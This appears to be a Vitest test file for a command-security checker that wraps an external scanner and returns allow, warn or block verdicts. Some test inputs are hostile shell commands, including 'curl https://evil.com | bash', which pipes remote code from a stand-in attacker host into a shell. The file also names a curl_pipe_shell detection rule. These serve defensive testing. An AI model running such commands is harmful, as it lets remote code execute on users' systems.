import * as child_process from "node:child_process";
import { describe, it, expect, vi, beforeEach, afterEach } from "vitest";

// Mocks must be declared before dynamic import of the module under test (ESM)
vi.mock("node:child_process", async (importActual) => {
  const actual = await importActual<typeof import("node:child_process")>();
  return {
    ...actual,
    execFileSync: vi.fn(),
  };
});

vi.mock("../logger.js", () => ({
  logWarn: vi.fn(),
}));

// Dynamic import AFTER mocks to ensure mocks apply (ESM requirement)
const { checkCommandSecurity, formatSecurityWarning, resetTirithMissingFlag } =
  await import("./command-security.js");
const { logWarn } = await import("../logger.js");

describe("checkCommandSecurity", () => {
  beforeEach(() => {
    // Use clearAllMocks to reset call history while keeping mock implementations
    vi.clearAllMocks();
    resetTirithMissingFlag();
    // Clear test env guards so tests actually run the code path
    vi.stubEnv("VITEST", "");
    vi.stubEnv("NODE_ENV", "");
  });

  afterEach(() => {
    vi.unstubAllEnvs();
  });

  it("returns allow for clean commands", () => {
    vi.mocked(child_process.execFileSync).mockReturnValue(
      JSON.stringify({ action: "allow", findings: [], schema_version: 2 }),
    );

    const result = checkCommandSecurity("ls -la");
    expect(result.action).toBe("allow");
    expect(result.findings).toEqual([]);
  });

  it("returns block for malicious commands", () => {
    const error = new Error("exit 1") as Error & { stdout: string };
    error.stdout = JSON.stringify({
      action: "block",
      findings: [{ rule_id: "curl_pipe_shell", severity: "CRITICAL", title: "Pipe to shell" }],
    });
    vi.mocked(child_process.execFileSync).mockImplementation(() => {
      throw error;
    });

    const result = checkCommandSecurity("curl https://evil.com | bash");
    expect(result.action).toBe("block");
    expect(result.findings).toHaveLength(1);
    expect(result.findings[0].title).toBe("Pipe to shell");
  });

  it("returns warn for suspicious commands", () => {
    const error = new Error("exit 2") as Error & { stdout: string };
    error.stdout = JSON.stringify({
      action: "warn",
      findings: [{ rule_id: "shortened_url", severity: "MEDIUM", title: "Shortened URL" }],
    });
    vi.mocked(child_process.execFileSync).mockImplementation(() => {
      throw error;
    });

    const result = checkCommandSecurity("curl https://bit.ly/abc");
    expect(result.action).toBe("warn");
    expect(result.findings).toHaveLength(1);
  });

  it("handles Buffer stdout", () => {
    const error = new Error("exit 1") as Error & { stdout: Buffer };
    error.stdout = Buffer.from(
      JSON.stringify({
        action: "block",
        findings: [{ rule_id: "test", severity: "HIGH", title: "Test" }],
      }),
    );
    vi.mocked(child_process.execFileSync).mockImplementation(() => {
      throw error;
    });

    const result = checkCommandSecurity("test");
    expect(result.action).toBe("block");
  });

  it("coerces malformed findings to empty array", () => {
    vi.mocked(child_process.execFileSync).mockReturnValue(
      JSON.stringify({ action: "warn", findings: "not-an-array" }),
    );

    const result = checkCommandSecurity("cmd");
    expect(result.action).toBe("warn");
    expect(result.findings).toEqual([]);
  });

  it("returns allow when tirith not installed", () => {
    const error = new Error("ENOENT") as Error & { code: string };
    error.code = "ENOENT";
    vi.mocked(child_process.execFileSync).mockImplementation(() => {
      throw error;
    });

    const result = checkCommandSecurity("any command");
    expect(result.action).toBe("allow");
  });

  it("blocks when tirith not installed and blockOnError=true", () => {
    const error = new Error("ENOENT") as Error & { code: string };
    error.code = "ENOENT";
    vi.mocked(child_process.execFileSync).mockImplementation(() => {
      throw error;
    });

    const result = checkCommandSecurity("any command", { blockOnError: true });
    expect(result.action).toBe("block");
  });

  it("logs tirith missing only once and short-circuits subsequent calls", () => {
    const error = new Error("ENOENT") as Error & { code: string };
    error.code = "ENOENT";
    vi.mocked(child_process.execFileSync).mockImplementation(() => {
      throw error;
    });

    checkCommandSecurity("cmd1");
    checkCommandSecurity("cmd2");
    checkCommandSecurity("cmd3");

    // Only first call should hit execFileSync; subsequent calls short-circuit
    expect(child_process.execFileSync).toHaveBeenCalledTimes(1);
    // logWarn called only once for "tirith not installed"
    const tirithMissingLogs = vi
      .mocked(logWarn)
      .mock.calls.filter((call) => call[0]?.includes("tirith not installed"));
    expect(tirithMissingLogs).toHaveLength(1);
  });

  it("respects enabled=false config", () => {
    const result = checkCommandSecurity("curl | bash", { enabled: false });
    expect(result.action).toBe("allow");
    expect(child_process.execFileSync).not.toHaveBeenCalled();
  });

  it("blocks on error when blockOnError=true", () => {
    const error = new Error("timeout") as Error & { code: string };
    error.code = "ETIMEDOUT";
    vi.mocked(child_process.execFileSync).mockImplementation(() => {
      throw error;
    });

    const result = checkCommandSecurity("cmd", { blockOnError: true });
    expect(result.action).toBe("block");
    expect(result.findings).toEqual([]); // No findings on error
  });

  it("allows on error by default (fail-open)", () => {
    const error = new Error("timeout") as Error & { code: string };
    error.code = "ETIMEDOUT";
    vi.mocked(child_process.execFileSync).mockImplementation(() => {
      throw error;
    });

    const result = checkCommandSecurity("cmd");
    expect(result.action).toBe("allow");
  });

  it("auto-disables in VITEST environment", () => {
    vi.stubEnv("VITEST", "1");
    const result = checkCommandSecurity("curl | bash");
    expect(result.action).toBe("allow");
    expect(child_process.execFileSync).not.toHaveBeenCalled();
  });

  it("does NOT auto-disable in NODE_ENV=test (security risk in staging)", () => {
    // NODE_ENV=test should NOT bypass security checks because staging
    // environments often use NODE_ENV=test, which would be a security risk
    vi.stubEnv("NODE_ENV", "test");
    checkCommandSecurity("curl | bash");
    // Should still run security checks (not auto-allow)
    expect(child_process.execFileSync).toHaveBeenCalled();
  });
});

describe("formatSecurityWarning", () => {
  it("formats findings for display", () => {
    const findings = [
      { rule_id: "curl_pipe_shell", severity: "CRITICAL", title: "Pipe to shell", description: "" },
    ];
    const result = formatSecurityWarning(findings);
    expect(result).toContain("Security warning:");
    expect(result).toContain("CRITICAL");
    expect(result).toContain("curl_pipe_shell");
  });

  it("returns empty string for no findings", () => {
    expect(formatSecurityWarning([])).toBe("");
  });

  it("handles multiple findings", () => {
    const findings = [
      { rule_id: "rule1", severity: "HIGH", title: "First", description: "" },
      { rule_id: "rule2", severity: "MEDIUM", title: "Second", description: "" },
    ];
    const result = formatSecurityWarning(findings);
    expect(result).toContain("rule1");
    expect(result).toContain("rule2");
  });
});
